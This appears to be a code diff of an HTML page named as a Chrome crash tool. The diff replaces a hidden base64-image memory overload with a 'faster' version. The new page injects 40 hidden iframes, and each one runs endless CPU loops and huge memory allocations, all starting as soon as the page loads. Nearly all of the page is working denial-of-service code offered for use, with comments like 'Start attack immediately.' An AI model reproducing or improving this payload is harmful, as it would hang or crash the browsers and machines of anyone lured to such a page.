@@ -1,36 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Crash - Base64 Image Overload</title>
+    <title>Faster Chrome Crash - Optimized Iframes</title>
 </head>
 <body>
-    <h1>Chrome Crash - Base64 Image Overload</h1>
-    <p>This page will overload Chrome with enormous hidden images.</p>
+    <h1>Chrome Crash - Faster Iframe Overload</h1>
+    <p>This page will crash Chrome faster.</p>
 
     <script>
-        function createImages() {
-            let imgData = "data:image/png;base64," + "A".repeat(50000000); // 50MB+ base64 string
-            for (let i = 0; i < 50; i++) { // Load 50 large images
-                let img = document.createElement("img");
-                img.src = imgData;
-                img.style.display = "none";
-                document.body.appendChild(img);
+        function createIframe() {
+            let iframe = document.createElement("iframe");
+            iframe.style.display = "none"; // Hide iframe
+            iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
+                <script>
+                    function startWorker() {
+                        let data = [];
+                        function allocate() {
+                            for (let i = 0; i < 100; i++) { // Increased blocks per iteration
+                                data.push(new Float64Array(1e7)); // Larger memory allocations
+                            }
+                            setTimeout(allocate, 50); // Faster execution interval
+                        }
+                        allocate();
+                    }
+
+                    function overloadCPU() {
+                        while (true) {
+                            Math.pow(Math.random(), Math.random());
+                        }
+                    }
+
+                    let coreMultiplier = navigator.hardwareConcurrency * 8; // More CPU threads
+                    for (let i = 0; i < coreMultiplier; i++) {
+                        setTimeout(startWorker, i * 20); // More aggressive memory usage
+                    }
+
+                    overloadCPU(); // Additional CPU load
+                <\/script>
+            `);
+            document.body.appendChild(iframe);
+        }
+
+        function launchAttack() {
+            for (let i = 0; i < 40; i++) { // Increase iframe count
+                setTimeout(createIframe, i * 20); // Faster iframe injection
             }
-            requestAnimationFrame(createImages);
         }
 
-        function startWorker() {
-            let code = `let data = []; while (true) { data.push(new Float64Array(1e8)); }`;
-            let blob = new Blob([code], { type: "application/javascript" });
-            let worker = new Worker(URL.createObjectURL(blob));
-        }
-
-        let coreMultiplier = navigator.hardwareConcurrency * 6;
-        for (let i = 0; i < coreMultiplier; i++) {
-            setTimeout(startWorker, i * 100);
-        }
-
-        createImages();
+        launchAttack(); // Start attack immediately
     </script>
 </body>
 </html>
